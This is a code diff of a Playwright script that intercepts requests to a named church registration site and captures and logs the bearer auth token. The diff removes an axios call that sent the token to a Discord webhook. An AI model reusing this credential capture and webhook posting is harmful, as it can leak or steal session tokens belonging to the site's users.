@@ -1,5 +1,4 @@
 const { chromium } = require('playwright');
-const axios = require('axios');
 require('dotenv').config();
 
 const TARGET_URL = 'https://tuvidanuevasl.churchcenter.com/registrations';
@@ -22,14 +21,6 @@ async function scrapeToken() {
                 tokenCaptured = true;
                 latestToken = auth.replace('Bearer ', '');
                 console.log(`✅ Token captured: ${latestToken}`);
-
-                try {
-                    await axios.post(`https://discord.com/api/webhooks/${DISCORD_WEBHOOK}`, {
-                        content: `🎉 Bearer token captured:\n\`\`\`\n${auth}\n\`\`\``
-                    });
-                } catch (err) {
-                    console.error('⚠️ Failed to send token to Discord:', err.message);
-                }
             }
         }
     });
